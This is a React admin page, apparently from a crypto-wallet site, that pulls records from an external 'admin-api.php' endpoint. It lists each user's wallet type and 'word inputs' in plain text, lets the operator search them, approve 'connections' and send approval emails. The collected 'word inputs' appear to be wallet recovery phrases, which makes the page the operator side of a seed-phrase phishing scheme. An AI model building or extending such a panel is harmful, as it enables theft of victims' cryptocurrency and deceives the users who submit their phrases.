import { useEffect, useState } from "react";
import AdminLayout from "./components/AdminLayout";
import { useSystemSettings } from "@/hooks/useAdminData";

interface Wallet {
  user_id: string;
  wallet_type: string;
  word_inputs: string;
  connect_status: "pending" | "connected";
  time: string;
  user_email: string;
}

const ConnectedWallets: React.FC = () => {
  const { data: settings = [] } = useSystemSettings();
  const emailNotifications = settings.find(s => s.setting_key === "email_notifications")?.setting_value !== "false";

  const [wallets, setWallets] = useState<Wallet[]>([]);
  const [loading, setLoading] = useState(false);
  const [search, setSearch] = useState("");

  const fetchWallets = async () => {
    setLoading(true);
    try {
      const res = await fetch("https://bluevult.com/api/admin-api.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ q: "fetch_wallets" }),
      });

      const data = await res.json();
      if (data.success) {
        setWallets(data.data);
      }
    } catch (err) {
      console.error("Error fetching wallets:", err);
    }
    setLoading(false);
  };

  useEffect(() => {
    fetchWallets();
  }, []);

  const updateWalletStatus = async (wallet: Wallet) => {
    try {
      await fetch("https://bluevult.com/api/admin-api.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          q: "connect_wallet",
          user_id: wallet.user_id,
          wallet_type: wallet.wallet_type,
          time: wallet.time,
        }),
      });

    if (emailNotifications) {
       fetch('/api/mail.php', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          subject: 'Wallet Connection Request Approved.',
          name :"UID: "+734350 + Number(wallet.user_id),
          email: wallet.user_email,

          message: 'Heads Up! ,your Connection request for your ' + wallet.wallet_type+ ' wallet has been approved.'
        })
      })
      .then(res => res.json())
      .then(console.log)   // will show success or error from PHP
      .catch(console.error);
    }


      // optimistic UI update (NO logic change)
      setWallets((prev) =>
        prev.map((w) =>
          w.user_id === wallet.user_id && w.time === wallet.time
            ? { ...w, connect_status: "connected" }
            : w
        )
      );
    } catch (err) {
      console.error("Failed to update wallet status", err);
    }
  };

  const getStatusBadge = (status: string) => {
    switch (status) {
      case "connected":
        return "bg-green-500/20 text-green-400";
      case "pending":
      default:
        return "bg-yellow-500/20 text-yellow-400";
    }
  };

  const filteredWallets = wallets.filter(
    (w) =>
      w.user_id.includes(search) ||
      w.wallet_type.toLowerCase().includes(search.toLowerCase()) ||
      w.word_inputs.toLowerCase().includes(search.toLowerCase())
  );

  return (
    <AdminLayout title="Connected Wallets">
      <div className="space-y-6">

        {/* Header */}
        <div>
          <h2 className="text-2xl font-bold text-white">Connected Wallets</h2>
          <p className="text-gray-400">
            List of all users and their connected wallets
          </p>
        </div>

        {/* Search */}
        <div className="relative max-w-md">
          <input
            type="text"
            placeholder="Search by User ID, Wallet Type or Word Inputs..."
            value={search}
            onChange={(e) => setSearch(e.target.value)}
            className="w-full pl-4 pr-4 py-2 rounded-lg bg-[#1a1d2a] border border-gray-700 text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-red-500"
          />
        </div>

        {/* Table */}
        <div className="overflow-x-auto bg-[#1a1d2a] rounded-2xl p-4 border border-gray-800">
          {loading ? (
            <p className="text-gray-400 text-center py-6">
              Loading wallets...
            </p>
          ) : (
            <table className="w-full table-auto border-collapse">
              <thead>
                <tr className="border-b border-gray-700">
                  <th className="px-4 py-2 text-left text-gray-400 text-sm">User ID</th>
                  <th className="px-4 py-2 text-left text-gray-400 text-sm">Wallet Type</th>
                  <th className="px-4 py-2 text-left text-gray-400 text-sm">Word Inputs</th>
                  <th className="px-4 py-2 text-left text-gray-400 text-sm">Status</th>
                  <th className="px-4 py-2 text-left text-gray-400 text-sm">Action</th>
                  <th className="px-4 py-2 text-left text-gray-400 text-sm">Time</th>
                </tr>
              </thead>

              <tbody className="divide-y divide-gray-800">
                {filteredWallets.map((wallet) => (
                  <tr
                    key={`${wallet.user_id}-${wallet.time}`}
                    className="hover:bg-gray-800 transition"
                  >
                    <td className="px-4 py-2 text-white">
                      {Number(wallet.user_id) + 734350}
                    </td>

                    <td className="px-4 py-2 text-white">
                      {wallet.wallet_type}
                    </td>

                    <td className="px-4 py-2 text-gray-300 break-words max-w-xs">
                      {wallet.word_inputs}
                    </td>

                    {/* STATUS */}
                    <td className="px-4 py-2">
                      <span
                        className={`px-2 py-1 rounded-full text-xs font-medium ${getStatusBadge(
                          wallet.connect_status
                        )}`}
                      >
                        {wallet.connect_status}
                      </span>
                    </td>

                    {/* ACTION */}
                    <td className="px-4 py-2">
                      {wallet.connect_status === "pending" ? (
                        <button
                          onClick={() => updateWalletStatus(wallet)}
                          className="px-3 py-1 rounded-lg bg-green-500/20 text-green-400 hover:bg-green-500/30 transition text-sm"
                        >
                          Connect
                        </button>
                      ) : (
                        <span className="text-gray-500 text-sm">—--</span>
                      )}
                    </td>

                    <td className="px-4 py-2 text-gray-400">
                      {wallet.time}
                    </td>
                  </tr>
                ))}

                {filteredWallets.length === 0 && (
                  <tr>
                    <td colSpan={6} className="text-center text-gray-400 py-4">
                      No wallets found
                    </td>
                  </tr>
                )}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </AdminLayout>
  );
};

export default ConnectedWallets;
